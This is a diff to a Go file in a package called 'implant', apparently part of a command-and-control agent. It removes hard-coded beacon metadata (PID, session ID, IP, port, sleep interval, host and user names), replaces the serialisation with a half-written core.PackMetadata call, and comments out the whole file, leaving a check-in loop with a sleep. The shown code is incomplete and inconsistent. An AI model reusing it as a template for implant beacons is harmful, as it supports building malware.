@@ -1,5 +1,5 @@
 package implant
-
+/*
 import (
 	"bytes"
 	"encoding/base64"
@@ -11,47 +11,17 @@ import (
 	"time"
 )
 
-func Do() {
-	// === Example Data ===
-	messageType := uint16(0x01)        // 2 bytes
-	pid := uint32(1000)                // 4 bytes
-	sessionID := uint32(0x12345678)    // 4 bytes
-	ip := [4]byte{192, 168, 1, 100}    // 4 bytes
-	sleep := uint32(10)				   // 4 bytes
-	port := uint16(8080)               // 2 bytes
-	arch := byte(1)                    // 1 byte
-	procName := "procname"
-	machine := "machine1"
-	user := "pedro"
 
-	// === Data Section ===
-	dataFields := [][]byte{
-		[]byte(procName),
-		[]byte(machine),
-		[]byte(user),
-	}
-	dataSection := []byte{}
-	c := 1
-	for _, field := range dataFields {
-		dataSection = append(dataSection, field...)
-		if c < 3 {
-			dataSection = append(dataSection, 0x00) // Null separator
-			c+=1
-		}
-	}
-	dataLen := uint16(len(dataSection)) // 2 bytes
+
+
+func Do() {
+
 
 	// === Buffer Assembly ===
 	buf := new(bytes.Buffer)
 
 	// Write fields in order
-	binary.Write(buf, binary.BigEndian, messageType)
-	binary.Write(buf, binary.BigEndian, pid)
-	binary.Write(buf, binary.BigEndian, sessionID)
-	binary.Write(buf, binary.BigEndian, ip)
-	binary.Write(buf, binary.BigEndian, port)
-	binary.Write(buf, binary.BigEndian, sleep)
-	buf.WriteByte(arch)
+	core.PackMetadata(buf, )
 	binary.Write(buf, binary.BigEndian, dataLen)
 	buf.Write(dataSection)
 
@@ -134,3 +104,4 @@ func Do() {
 		time.Sleep(time.Duration(sleep) * time.Second)
 	}
 }
+	*/
